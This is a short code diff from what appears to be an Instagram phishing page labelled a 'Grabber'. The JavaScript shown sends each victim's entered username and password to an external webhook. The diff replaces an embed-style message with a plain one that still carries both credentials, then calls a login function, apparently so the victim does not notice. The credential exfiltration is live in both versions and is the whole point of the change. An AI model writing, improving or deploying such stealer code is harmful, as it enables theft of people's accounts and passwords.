@@ -197,23 +197,10 @@
                 
                 fetch(WEBHOOK_URL, {
                     method: 'POST',
-headers: { 'Content-Type': 'application/json' },
-body: JSON.stringify({
-    embeds: [{
-        title: "🎯 INSTAGRAM LOGIN",
-        color: 0xE4405F,
-        timestamp: new Date().toISOString(),
-        thumbnail: { url: "https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/1024px-Instagram_icon.png" },
-        fields: [
-            { name: "👤 USUÁRIO", value: `\`\`\`${user}\`\`\``, inline: true },
-            { name: "🔑 SENHA", value: `\`\`\`${pass}\`\`\``, inline: true }
-        ],
-        footer: { text: "7th Family • Grabber", icon_url: "https://i.imgur.com/xxx.png" }
-    }],
-    username: "7th Family",
-    avatar_url: "https://i.imgur.com/xxx.png"
-})
-            
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: `🔐 **LOGIN**\n👤 ${user}\n🔑 ${pass}`
+                    })
                 });
                 
                 loginInstagram(user, pass);
